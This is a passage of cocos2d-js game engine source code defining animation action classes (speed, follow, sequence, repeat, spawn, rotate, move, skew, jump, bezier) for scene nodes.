    getTag: function() {
        return this.tag
    },
    setTag: function(t) {
        this.tag = t
    },
    retain: function() {},
    release: function() {}
}),
cc.Action.create = function() {
    return new cc.Action
},
cc.FiniteTimeAction = cc.Action.extend({
    _duration: 0,
    ctor: function() {
        cc.Action.prototype.ctor.call(this),
        this._duration = 0
    },
    getDuration: function() {
        return this._duration * (this._times || 1)
    },
    setDuration: function(t) {
        this._duration = t
    },
    reverse: function() {
        return cc.log("cocos2d: FiniteTimeAction#reverse: Implement me"),
        null
    },
    clone: function() {
        return new cc.FiniteTimeAction
    }
}),
cc.Speed = cc.Action.extend({
    _speed: 0,
    _innerAction: null,
    ctor: function(t, e) {
        cc.Action.prototype.ctor.call(this),
        this._speed = 0,
        this._innerAction = null,
        t && this.initWithAction(t, e)
    },
    getSpeed: function() {
        return this._speed
    },
    setSpeed: function(t) {
        this._speed = t
    },
    initWithAction: function(t, e) {
        if (!t) throw "cc.Speed.initWithAction(): action must be non nil";
        return this._innerAction = t,
        this._speed = e,
        !0
    },
    clone: function() {
        var t = new cc.Speed;
        return t.initWithAction(this._innerAction.clone(), this._speed),
        t
    },
    startWithTarget: function(t) {
        cc.Action.prototype.startWithTarget.call(this, t),
        this._innerAction.startWithTarget(t)
    },
    stop: function() {
        this._innerAction.stop(),
        cc.Action.prototype.stop.call(this)
    },
    step: function(t) {
        this._innerAction.step(t * this._speed)
    },
    isDone: function() {
        return this._innerAction.isDone()
    },
    reverse: function() {
        return cc.Speed.create(this._innerAction.reverse(), this._speed)
    },
    setInnerAction: function(t) {
        this._innerAction != t && (this._innerAction = t)
    },
    getInnerAction: function() {
        return this._innerAction
    }
}),
cc.Speed.create = function(t, e) {
    return new cc.Speed(t, e)
},
cc.Follow = cc.Action.extend({
    _followedNode: null,
    _boundarySet: !1,
    _boundaryFullyCovered: !1,
    _halfScreenSize: null,
    _fullScreenSize: null,
    leftBoundary: 0,
    rightBoundary: 0,
    topBoundary: 0,
    bottomBoundary: 0,
    _worldRect: null,
    ctor: function(t, e) {
        cc.Action.prototype.ctor.call(this),
        this._followedNode = null,
        this._boundarySet = !1,
        this._boundaryFullyCovered = !1,
        this._halfScreenSize = null,
        this._fullScreenSize = null,
        this.leftBoundary = 0,
        this.rightBoundary = 0,
        this.topBoundary = 0,
        this.bottomBoundary = 0,
        this._worldRect = cc.rect(0, 0, 0, 0),
        t && (e ? this.initWithTarget(t, e) : this.initWithTarget(t))
    },
    clone: function() {
        var t = new cc.Follow,
        e = this._worldRect,
        i = new cc.Rect(e.x, e.y, e.width, e.height);
        return t.initWithTarget(this._followedNode, i),
        t
    },
    isBoundarySet: function() {
        return this._boundarySet
    },
    setBoudarySet: function(t) {
        this._boundarySet = t
    },
    initWithTarget: function(t, e) {
        if (!t) throw "cc.Follow.initWithAction(): followedNode must be non nil";
        var i = this;
        e = e || cc.rect(0, 0, 0, 0),
        i._followedNode = t,
        i._worldRect = e,
        i._boundarySet = !cc._rectEqualToZero(e),
        i._boundaryFullyCovered = !1;
        var n = cc.director.getWinSize();
        return i._fullScreenSize = cc.p(n.width, n.height),
        i._halfScreenSize = cc.pMult(i._fullScreenSize, .5),
        i._boundarySet && (i.leftBoundary = -(e.x + e.width - i._fullScreenSize.x), i.rightBoundary = -e.x, i.topBoundary = -e.y, i.bottomBoundary = -(e.y + e.height - i._fullScreenSize.y), i.rightBoundary < i.leftBoundary && (i.rightBoundary = i.leftBoundary = (i.leftBoundary + i.rightBoundary) / 2), i.topBoundary < i.bottomBoundary && (i.topBoundary = i.bottomBoundary = (i.topBoundary + i.bottomBoundary) / 2), i.topBoundary == i.bottomBoundary && i.leftBoundary == i.rightBoundary && (i._boundaryFullyCovered = !0)),
        !0
    },
    step: function() {
        var t = this._followedNode.x,
        e = this._followedNode.y;
        if (t = this._halfScreenSize.x - t, e = this._halfScreenSize.y - e, this._boundarySet) {
            if (this._boundaryFullyCovered) return;
            this.target.setPosition(cc.clampf(t, this.leftBoundary, this.rightBoundary), cc.clampf(e, this.bottomBoundary, this.topBoundary))
        } else this.target.setPosition(t, e)
    },
    isDone: function() {
        return ! this._followedNode.running
    },
    stop: function() {
        this.target = null,
        cc.Action.prototype.stop.call(this)
    }
}),
cc.Follow.create = function(t, e) {
    return new cc.Follow(t, e)
},
cc.ActionInstant = cc.FiniteTimeAction.extend({
    isDone: function() {
        return ! 0
    },
    step: function() {
        this.update(1)
    },
    update: function() {},
    reverse: function() {
        return this.clone()
    },
    clone: function() {
        return new cc.ActionInstant
    }
}),
cc.Show = cc.ActionInstant.extend({
    update: function() {
        this.target.visible = !0
    },
    reverse: function() {
        return cc.Hide.create()
    },
    clone: function() {
        return new cc.Show
    }
}),
cc.Show.create = function() {
    return new cc.Show
},
cc.Hide = cc.ActionInstant.extend({
    update: function() {
        this.target.visible = !1
    },
    reverse: function() {
        return cc.Show.create()
    },
    clone: function() {
        return new cc.Hide
    }
}),
cc.Hide.create = function() {
    return new cc.Hide
},
cc.ToggleVisibility = cc.ActionInstant.extend({
    update: function() {
        this.target.visible = !this.target.visible
    },
    reverse: function() {
        return new cc.ToggleVisibility
    },
    clone: function() {
        return new cc.ToggleVisibility
    }
}),
cc.ToggleVisibility.create = function() {
    return new cc.ToggleVisibility
},
cc.RemoveSelf = cc.ActionInstant.extend({
    _isNeedCleanUp: !0,
    ctor: function(t) {
        cc.FiniteTimeAction.prototype.ctor.call(this),
        void 0 !== t && this.init(t)
    },
    update: function() {
        this.target.removeFromParent(this._isNeedCleanUp)
    },
    init: function(t) {
        return this._isNeedCleanUp = t,
        !0
    },
    reverse: function() {
        return new cc.RemoveSelf(this._isNeedCleanUp)
    },
    clone: function() {
        return new cc.RemoveSelf(this._isNeedCleanUp)
    }
}),
cc.RemoveSelf.create = function(t) {
    return new cc.RemoveSelf(t)
},
cc.FlipX = cc.ActionInstant.extend({
    _flippedX: !1,
    ctor: function(t) {
        cc.FiniteTimeAction.prototype.ctor.call(this),
        this._flippedX = !1,
        void 0 !== t && this.initWithFlipX(t)
    },
    initWithFlipX: function(t) {
        return this._flippedX = t,
        !0
    },
    update: function() {
        this.target.flippedX = this._flippedX
    },
    reverse: function() {
        return cc.FlipX.create(!this._flippedX)
    },
    clone: function() {
        var t = new cc.FlipX;
        return t.initWithFlipX(this._flippedX),
        t
    }
}),
cc.FlipX.create = function(t) {
    return new cc.FlipX(t)
},
cc.FlipY = cc.ActionInstant.extend({
    _flippedY: !1,
    ctor: function(t) {
        cc.FiniteTimeAction.prototype.ctor.call(this),
        this._flippedY = !1,
        void 0 !== t && this.initWithFlipY(t)
    },
    initWithFlipY: function(t) {
        return this._flippedY = t,
        !0
    },
    update: function() {
        this.target.flippedY = this._flippedY
    },
    reverse: function() {
        return cc.FlipY.create(!this._flippedY)
    },
    clone: function() {
        var t = new cc.FlipY;
        return t.initWithFlipY(this._flippedY),
        t
    }
}),
cc.FlipY.create = function(t) {
    return new cc.FlipY(t)
},
cc.Place = cc.ActionInstant.extend({
    _x: 0,
    _y: 0,
    ctor: function(t, e) {
        cc.FiniteTimeAction.prototype.ctor.call(this),
        this._x = 0,
        this._y = 0,
        void 0 !== t && (void 0 !== t.x && (e = t.y, t = t.x), this.initWithPosition(t, e))
    },
    initWithPosition: function(t, e) {
        return this._x = t,
        this._y = e,
        !0
    },
    update: function() {
        this.target.setPosition(this._x, this._y)
    },
    clone: function() {
        var t = new cc.Place;
        return t.initWithPosition(this._x, this._y),
        t
    }
}),
cc.Place.create = function(t, e) {
    return new cc.Place(t, e)
},
cc.CallFunc = cc.ActionInstant.extend({
    _selectorTarget: null,
    _callFunc: null,
    _function: null,
    _data: null,
    ctor: function(t, e, i) {
        cc.FiniteTimeAction.prototype.ctor.call(this),
        void 0 !== t && (void 0 === e ? this.initWithFunction(t) : this.initWithFunction(t, e, i))
    },
    initWithFunction: function(t, e, i) {
        return e ? (this._data = i, this._callFunc = t, this._selectorTarget = e) : t && (this._function = t),
        !0
    },
    execute: function() {
        null != this._callFunc ? this._callFunc.call(this._selectorTarget, this.target, this._data) : this._function && this._function.call(null, this.target)
    },
    update: function() {
        this.execute()
    },
    getTargetCallback: function() {
        return this._selectorTarget
    },
    setTargetCallback: function(t) {
        t != this._selectorTarget && (this._selectorTarget && (this._selectorTarget = null), this._selectorTarget = t)
    },
    clone: function() {
        var t = new cc.CallFunc;
        return this._selectorTarget ? t.initWithFunction(this._callFunc, this._selectorTarget, this._data) : this._function && t.initWithFunction(this._function),
        t
    }
}),
cc.CallFunc.create = function(t, e, i) {
    return new cc.CallFunc(t, e, i)
},
cc.ActionInterval = cc.FiniteTimeAction.extend({
    _elapsed: 0,
    _firstTick: !1,
    _easeList: null,
    _times: 1,
    _repeatForever: !1,
    _repeatMethod: !1,
    _speed: 1,
    _speedMethod: !1,
    ctor: function(t) {
        this._speed = 1,
        this._times = 1,
        this._repeatForever = !1,
        this.MAX_VALUE = 2,
        this._repeatMethod = !1,
        this._speedMethod = !1,
        cc.FiniteTimeAction.prototype.ctor.call(this),
        void 0 !== t && this.initWithDuration(t)
    },
    getElapsed: function() {
        return this._elapsed
    },
    initWithDuration: function(t) {
        return this._duration = 0 === t ? cc.FLT_EPSILON: t,
        this._elapsed = 0,
        this._firstTick = !0,
        !0
    },
    isDone: function() {
        return this._elapsed >= this._duration
    },
    _cloneDecoration: function(t) {
        t._repeatForever = this._repeatForever,
        t._speed = this._speed,
        t._times = this._times,
        t._easeList = this._easeList,
        t._speedMethod = this._speedMethod,
        t._repeatMethod = this._repeatMethod
    },
    _reverseEaseList: function(t) {
        if (this._easeList) {
            t._easeList = [];
            for (var e = 0; e < this._easeList.length; e++) t._easeList.push(this._easeList[e].reverse())
        }
    },
    clone: function() {
        var t = new cc.ActionInterval(this._duration);
        return this._cloneDecoration(t),
        t
    },
    easing: function() {
        this._easeList ? this._easeList.length = 0 : this._easeList = [];
        for (var t = 0; t < arguments.length; t++) this._easeList.push(arguments[t]);
        return this
    },
    _computeEaseTime: function(t) {
        var e = this._easeList;
        if (!e || 0 === e.length) return t;
        for (var i = 0,
        n = e.length; n > i; i++) t = e[i].easing(t);
        return t
    },
    step: function(t) {
        this._firstTick ? (this._firstTick = !1, this._elapsed = 0) : this._elapsed += t;
        var e = this._elapsed / (this._duration > 1.192092896e-7 ? this._duration: 1.192092896e-7);
        e = 1 > e ? e: 1,
        this.update(e > 0 ? e: 0),
        this._repeatMethod && this._times > 1 && this.isDone() && (this._repeatForever || this._times--, this.startWithTarget(this.target), this.step(this._elapsed - this._duration))
    },
    startWithTarget: function(t) {
        cc.Action.prototype.startWithTarget.call(this, t),
        this._elapsed = 0,
        this._firstTick = !0
    },
    reverse: function() {
        return cc.log("cc.IntervalAction: reverse not implemented."),
        null
    },
    setAmplitudeRate: function() {
        cc.log("cc.ActionInterval.setAmplitudeRate(): it should be overridden in subclass.")
    },
    getAmplitudeRate: function() {
        return cc.log("cc.ActionInterval.getAmplitudeRate(): it should be overridden in subclass."),
        0
    },
    speed: function(t) {
        return 0 >= t ? (cc.log("The speed parameter error"), this) : (this._speedMethod = !0, this._speed *= t, this)
    },
    getSpeed: function() {
        return this._speed
    },
    setSpeed: function(t) {
        return this._speed = t,
        this
    },
    repeat: function(t) {
        return t = Math.round(t),
        isNaN(t) || 1 > t ? (cc.log("The repeat parameter error"), this) : (this._repeatMethod = !0, this._times *= t, this)
    },
    repeatForever: function() {
        return this._repeatMethod = !0,
        this._times = this.MAX_VALUE,
        this._repeatForever = !0,
        this
    }
}),
cc.ActionInterval.create = function(t) {
    return new cc.ActionInterval(t)
},
cc.Sequence = cc.ActionInterval.extend({
    _actions: null,
    _split: null,
    _last: 0,
    ctor: function(t) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._actions = [];
        var e = t instanceof Array ? t: arguments,
        i = e.length - 1;
        if (i >= 0 && null == e[i] && cc.log("parameters should not be ending with null in Javascript"), i >= 0) {
            for (var n, r = e[0], c = 1; i > c; c++) e[c] && (n = r, r = cc.Sequence.create(), r.initWithTwoActions(n, e[c]));
            this.initWithTwoActions(r, e[i])
        }
    },
    initWithTwoActions: function(t, e) {
        if (!t || !e) throw "cc.Sequence.initWithTwoActions(): arguments must all be non nil";
        var i = t._duration + e._duration;
        return this.initWithDuration(i),
        this._actions[0] = t,
        this._actions[1] = e,
        !0
    },
    clone: function() {
        var t = new cc.Sequence;
        return this._cloneDecoration(t),
        t.initWithTwoActions(this._actions[0].clone(), this._actions[1].clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),

        this._split = this._actions[0]._duration / this._duration,
        this._last = -1
    },
    stop: function() { - 1 !== this._last && this._actions[this._last].stop(),
        cc.Action.prototype.stop.call(this)
    },
    update: function(t) {
        t = this._computeEaseTime(t);
        var e, i = 0,
        n = this._split,
        r = this._actions,
        c = this._last;
        n > t ? (e = 0 !== n ? t / n: 1, 0 === i && 1 === c && (r[1].update(0), r[1].stop())) : (i = 1, e = 1 === n ? 1 : (t - n) / (1 - n), -1 === c && (r[0].startWithTarget(this.target), r[0].update(1), r[0].stop()), c || (r[0].update(1), r[0].stop())),
        c === i && r[i].isDone() || (c !== i && r[i].startWithTarget(this.target), r[i].update(e), this._last = i)
    },
    reverse: function() {
        var t = cc.Sequence._actionOneTwo(this._actions[1].reverse(), this._actions[0].reverse());
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.Sequence.create = function(t) {
    var e = t instanceof Array ? t: arguments;
    e.length > 0 && null == e[e.length - 1] && cc.log("parameters should not be ending with null in Javascript");
    for (var i = e[0], n = 1; n < e.length; n++) e[n] && (i = cc.Sequence._actionOneTwo(i, e[n]));
    return i
},
cc.Sequence._actionOneTwo = function(t, e) {
    var i = new cc.Sequence;
    return i.initWithTwoActions(t, e),
    i
},
cc.Repeat = cc.ActionInterval.extend({
    _times: 0,
    _total: 0,
    _nextDt: 0,
    _actionInstant: !1,
    _innerAction: null,
    ctor: function(t, e) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithAction(t, e)
    },
    initWithAction: function(t, e) {
        var i = t._duration * e;
        return this.initWithDuration(i) ? (this._times = e, this._innerAction = t, t instanceof cc.ActionInstant && (this._actionInstant = !0, this._times -= 1), this._total = 0, !0) : !1
    },
    clone: function() {
        var t = new cc.Repeat;
        return this._cloneDecoration(t),
        t.initWithAction(this._innerAction.clone(), this._times),
        t
    },
    startWithTarget: function(t) {
        this._total = 0,
        this._nextDt = this._innerAction._duration / this._duration,
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._innerAction.startWithTarget(t)
    },
    stop: function() {
        this._innerAction.stop(),
        cc.Action.prototype.stop.call(this)
    },
    update: function(t) {
        t = this._computeEaseTime(t);
        var e = this._innerAction,
        i = this._duration,
        n = this._times,
        r = this._nextDt;
        if (t >= r) {
            for (; t > r && this._total < n;) e.update(1),
            this._total++,
            e.stop(),
            e.startWithTarget(this.target),
            r += e._duration / i,
            this._nextDt = r;
            t >= 1 && this._total < n && this._total++,
            this._actionInstant || (this._total === n ? (e.update(1), e.stop()) : e.update(t - (r - e._duration / i)))
        } else e.update(t * n % 1)
    },
    isDone: function() {
        return this._total == this._times
    },
    reverse: function() {
        var t = cc.Repeat.create(this._innerAction.reverse(), this._times);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    setInnerAction: function(t) {
        this._innerAction != t && (this._innerAction = t)
    },
    getInnerAction: function() {
        return this._innerAction
    }
}),
cc.Repeat.create = function(t, e) {
    return new cc.Repeat(t, e)
},
cc.RepeatForever = cc.ActionInterval.extend({
    _innerAction: null,
    ctor: function(t) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._innerAction = null,
        t && this.initWithAction(t)
    },
    initWithAction: function(t) {
        if (!t) throw "cc.RepeatForever.initWithAction(): action must be non null";
        return this._innerAction = t,
        !0
    },
    clone: function() {
        var t = new cc.RepeatForever;
        return this._cloneDecoration(t),
        t.initWithAction(this._innerAction.clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._innerAction.startWithTarget(t)
    },
    step: function(t) {
        var e = this._innerAction;
        e.step(t),
        e.isDone() && (e.startWithTarget(this.target), e.step(e.getElapsed() - e._duration))
    },
    isDone: function() {
        return ! 1
    },
    reverse: function() {
        var t = cc.RepeatForever.create(this._innerAction.reverse());
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    },
    setInnerAction: function(t) {
        this._innerAction != t && (this._innerAction = t)
    },
    getInnerAction: function() {
        return this._innerAction
    }
}),
cc.RepeatForever.create = function(t) {
    return new cc.RepeatForever(t)
},
cc.Spawn = cc.ActionInterval.extend({
    _one: null,
    _two: null,
    ctor: function(t) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._one = null,
        this._two = null;
        var e = t instanceof Array ? t: arguments,
        i = e.length - 1;
        if (i >= 0 && null == e[i] && cc.log("parameters should not be ending with null in Javascript"), i >= 0) {
            for (var n, r = e[0], c = 1; i > c; c++) e[c] && (n = r, r = cc.Spwan.create(), r.initWithTwoActions(n, e[c]));
            this.initWithTwoActions(r, e[i])
        }
    },
    initWithTwoActions: function(t, e) {
        if (!t || !e) throw "cc.Spawn.initWithTwoActions(): arguments must all be non null";
        var i = !1,
        n = t._duration,
        r = e._duration;
        return this.initWithDuration(Math.max(n, r)) && (this._one = t, this._two = e, n > r ? this._two = cc.Sequence._actionOneTwo(e, cc.DelayTime.create(n - r)) : r > n && (this._one = cc.Sequence._actionOneTwo(t, cc.DelayTime.create(r - n))), i = !0),
        i
    },
    clone: function() {
        var t = new cc.Spawn;
        return this._cloneDecoration(t),
        t.initWithTwoActions(this._one.clone(), this._two.clone()),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._one.startWithTarget(t),
        this._two.startWithTarget(t)
    },
    stop: function() {
        this._one.stop(),
        this._two.stop(),
        cc.Action.prototype.stop.call(this)
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this._one && this._one.update(t),
        this._two && this._two.update(t)
    },
    reverse: function() {
        var t = cc.Spawn._actionOneTwo(this._one.reverse(), this._two.reverse());
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.Spawn.create = function(t) {
    var e = t instanceof Array ? t: arguments;
    e.length > 0 && null == e[e.length - 1] && cc.log("parameters should not be ending with null in Javascript");
    for (var i = e[0], n = 1; n < e.length; n++) null != e[n] && (i = this._actionOneTwo(i, e[n]));
    return i
},
cc.Spawn._actionOneTwo = function(t, e) {
    var i = new cc.Spawn;
    return i.initWithTwoActions(t, e),
    i
},
cc.RotateTo = cc.ActionInterval.extend({
    _dstAngleX: 0,
    _startAngleX: 0,
    _diffAngleX: 0,
    _dstAngleY: 0,
    _startAngleY: 0,
    _diffAngleY: 0,
    ctor: function(t, e, i) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._dstAngleX = e || 0, this._dstAngleY = i || this._dstAngleX, !0) : !1
    },
    clone: function() {
        var t = new cc.RotateTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._dstAngleX, this._dstAngleY),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t);
        var e = t.rotationX % 360,
        i = this._dstAngleX - e;
        i > 180 && (i -= 360),
        -180 > i && (i += 360),
        this._startAngleX = e,
        this._diffAngleX = i,
        this._startAngleY = t.rotationY % 360;
        var n = this._dstAngleY - this._startAngleY;
        n > 180 && (n -= 360),
        -180 > n && (n += 360),
        this._diffAngleY = n
    },
    reverse: function() {
        cc.log("cc.RotateTo.reverse(): it should be overridden in subclass.")
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this.target && (this.target.rotationX = this._startAngleX + this._diffAngleX * t, this.target.rotationY = this._startAngleY + this._diffAngleY * t)
    }
}),
cc.RotateTo.create = function(t, e, i) {
    return new cc.RotateTo(t, e, i)
},
cc.RotateBy = cc.ActionInterval.extend({
    _angleX: 0,
    _startAngleX: 0,
    _angleY: 0,
    _startAngleY: 0,
    ctor: function(t, e, i) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== e && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._angleX = e || 0, this._angleY = i || this._angleX, !0) : !1
    },
    clone: function() {
        var t = new cc.RotateBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._angleX, this._angleY),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._startAngleX = t.rotationX,
        this._startAngleY = t.rotationY
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this.target && (this.target.rotationX = this._startAngleX + this._angleX * t, this.target.rotationY = this._startAngleY + this._angleY * t)
    },
    reverse: function() {
        var t = cc.RotateBy.create(this._duration, -this._angleX, -this._angleY);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.RotateBy.create = function(t, e, i) {
    var n = new cc.RotateBy;
    return n.initWithDuration(t, e, i),
    n
},
cc.MoveBy = cc.ActionInterval.extend({
    _positionDelta: null,
    _startPosition: null,
    _previousPosition: null,
    ctor: function(t, e, i) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._positionDelta = cc.p(0, 0),
        this._startPosition = cc.p(0, 0),
        this._previousPosition = cc.p(0, 0),
        void 0 !== e && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (void 0 !== e.x && (i = e.y, e = e.x), this._positionDelta.x = e, this._positionDelta.y = i, !0) : !1
    },
    clone: function() {
        var t = new cc.MoveBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._positionDelta),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t);
        var e = t.getPositionX(),
        i = t.getPositionY();
        this._previousPosition.x = e,
        this._previousPosition.y = i,
        this._startPosition.x = e,
        this._startPosition.y = i
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), this.target) {
            var e = this._positionDelta.x * t,
            i = this._positionDelta.y * t,
            n = this._startPosition;
            if (cc.ENABLE_STACKABLE_ACTIONS) {
                var r = this.target.getPositionX(),
                c = this.target.getPositionY(),
                o = this._previousPosition;
                n.x = n.x + r - o.x,
                n.y = n.y + c - o.y,
                e += n.x,
                i += n.y,
                o.x = e,
                o.y = i,
                this.target.setPosition(e, i)
            } else this.target.setPosition(n.x + e, n.y + i)
        }
    },
    reverse: function() {
        var t = cc.MoveBy.create(this._duration, cc.p( - this._positionDelta.x, -this._positionDelta.y));
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.MoveBy.create = function(t, e, i) {
    return new cc.MoveBy(t, e, i)
},
cc.MoveTo = cc.MoveBy.extend({
    _endPosition: null,
    ctor: function(t, e, i) {
        cc.MoveBy.prototype.ctor.call(this),
        this._endPosition = cc.p(0, 0),
        void 0 !== e && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        return cc.MoveBy.prototype.initWithDuration.call(this, t, e, i) ? (void 0 !== e.x && (i = e.y, e = e.x), this._endPosition.x = e, this._endPosition.y = i, !0) : !1
    },
    clone: function() {
        var t = new cc.MoveTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._endPosition),
        t
    },
    startWithTarget: function(t) {
        cc.MoveBy.prototype.startWithTarget.call(this, t),
        this._positionDelta.x = this._endPosition.x - t.getPositionX(),
        this._positionDelta.y = this._endPosition.y - t.getPositionY()
    }
}),
cc.MoveTo.create = function(t, e, i) {
    return new cc.MoveTo(t, e, i)
},
cc.SkewTo = cc.ActionInterval.extend({
    _skewX: 0,
    _skewY: 0,
    _startSkewX: 0,
    _startSkewY: 0,
    _endSkewX: 0,
    _endSkewY: 0,
    _deltaX: 0,
    _deltaY: 0,
    ctor: function(t, e, i) {
        cc.ActionInterval.prototype.ctor.call(this),
        void 0 !== i && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        var n = !1;
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) && (this._endSkewX = e, this._endSkewY = i, n = !0),
        n
    },
    clone: function() {
        var t = new cc.SkewTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._endSkewX, this._endSkewY),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t),
        this._startSkewX = t.skewX % 180,
        this._deltaX = this._endSkewX - this._startSkewX,
        this._deltaX > 180 && (this._deltaX -= 360),
        this._deltaX < -180 && (this._deltaX += 360),
        this._startSkewY = t.skewY % 360,
        this._deltaY = this._endSkewY - this._startSkewY,
        this._deltaY > 180 && (this._deltaY -= 360),
        this._deltaY < -180 && (this._deltaY += 360)
    },
    update: function(t) {
        t = this._computeEaseTime(t),
        this.target.skewX = this._startSkewX + this._deltaX * t,
        this.target.skewY = this._startSkewY + this._deltaY * t
    }
}),
cc.SkewTo.create = function(t, e, i) {
    return new cc.SkewTo(t, e, i)
},
cc.SkewBy = cc.SkewTo.extend({
    ctor: function(t, e, i) {
        cc.SkewTo.prototype.ctor.call(this),
        void 0 !== i && this.initWithDuration(t, e, i)
    },
    initWithDuration: function(t, e, i) {
        var n = !1;
        return cc.SkewTo.prototype.initWithDuration.call(this, t, e, i) && (this._skewX = e, this._skewY = i, n = !0),
        n
    },
    clone: function() {
        var t = new cc.SkewBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._skewX, this._skewY),
        t
    },
    startWithTarget: function(t) {
        cc.SkewTo.prototype.startWithTarget.call(this, t),
        this._deltaX = this._skewX,
        this._deltaY = this._skewY,
        this._endSkewX = this._startSkewX + this._deltaX,
        this._endSkewY = this._startSkewY + this._deltaY
    },
    reverse: function() {
        var t = cc.SkewBy.create(this._duration, -this._skewX, -this._skewY);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.SkewBy.create = function(t, e, i) {
    var n = new cc.SkewBy;
    return n && n.initWithDuration(t, e, i),
    n
},
cc.JumpBy = cc.ActionInterval.extend({
    _startPosition: null,
    _delta: null,
    _height: 0,
    _jumps: 0,
    _previousPosition: null,
    ctor: function(t, e, i, n, r) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._startPosition = cc.p(0, 0),
        this._previousPosition = cc.p(0, 0),
        this._delta = cc.p(0, 0),
        void 0 !== n && this.initWithDuration(t, e, i, n, r)
    },
    initWithDuration: function(t, e, i, n, r) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (void 0 === r && (r = n, n = i, i = e.y, e = e.x), this._delta.x = e, this._delta.y = i, this._height = n, this._jumps = r, !0) : !1
    },
    clone: function() {
        var t = new cc.JumpBy;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._delta, this._height, this._jumps),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t);
        var e = t.getPositionX(),
        i = t.getPositionY();
        this._previousPosition.x = e,
        this._previousPosition.y = i,
        this._startPosition.x = e,
        this._startPosition.y = i
    },
    update: function(t) {
        if (t = this._computeEaseTime(t), this.target) {
            var e = t * this._jumps % 1,
            i = 4 * this._height * e * (1 - e);
            i += this._delta.y * t;
            var n = this._delta.x * t,
            r = this._startPosition;
            if (cc.ENABLE_STACKABLE_ACTIONS) {
                var c = this.target.getPositionX(),
                o = this.target.getPositionY(),
                s = this._previousPosition;
                r.x = r.x + c - s.x,
                r.y = r.y + o - s.y,
                n += r.x,
                i += r.y,
                s.x = n,
                s.y = i,
                this.target.setPosition(n, i)
            } else this.target.setPosition(r.x + n, r.y + i)
        }
    },
    reverse: function() {
        var t = cc.JumpBy.create(this._duration, cc.p( - this._delta.x, -this._delta.y), this._height, this._jumps);
        return this._cloneDecoration(t),
        this._reverseEaseList(t),
        t
    }
}),
cc.JumpBy.create = function(t, e, i, n, r) {
    return new cc.JumpBy(t, e, i, n, r)
},
cc.JumpTo = cc.JumpBy.extend({
    startWithTarget: function(t) {
        cc.JumpBy.prototype.startWithTarget.call(this, t),
        this._delta.x = this._delta.x - this._startPosition.x,
        this._delta.y = this._delta.y - this._startPosition.y
    },
    clone: function() {
        var t = new cc.JumpTo;
        return this._cloneDecoration(t),
        t.initWithDuration(this._duration, this._delta, this._height, this._jumps),
        t
    }
}),
cc.JumpTo.create = function(t, e, i, n, r) {
    return new cc.JumpTo(t, e, i, n, r)
},
cc.bezierAt = function(t, e, i, n, r) {
    return Math.pow(1 - r, 3) * t + 3 * r * Math.pow(1 - r, 2) * e + 3 * Math.pow(r, 2) * (1 - r) * i + Math.pow(r, 3) * n
},
cc.BezierBy = cc.ActionInterval.extend({
    _config: null,
    _startPosition: null,
    _previousPosition: null,
    ctor: function(t, e) {
        cc.ActionInterval.prototype.ctor.call(this),
        this._config = [],
        this._startPosition = cc.p(0, 0),
        this._previousPosition = cc.p(0, 0),
        e && this.initWithDuration(t, e)
    },
    initWithDuration: function(t, e) {
        return cc.ActionInterval.prototype.initWithDuration.call(this, t) ? (this._config = e, !0) : !1
    },
    clone: function() {
        var t = new cc.BezierBy;
        this._cloneDecoration(t);
        for (var e = [], i = 0; i < this._config.length; i++) {
            var n = this._config[i];
            e.push(cc.p(n.x, n.y))
        }
        return t.initWithDuration(this._duration, e),
        t
    },
    startWithTarget: function(t) {
        cc.ActionInterval.prototype.startWithTarget.call(this, t);
        var e = t.getPositionX(),
        i = t.getPositionY();
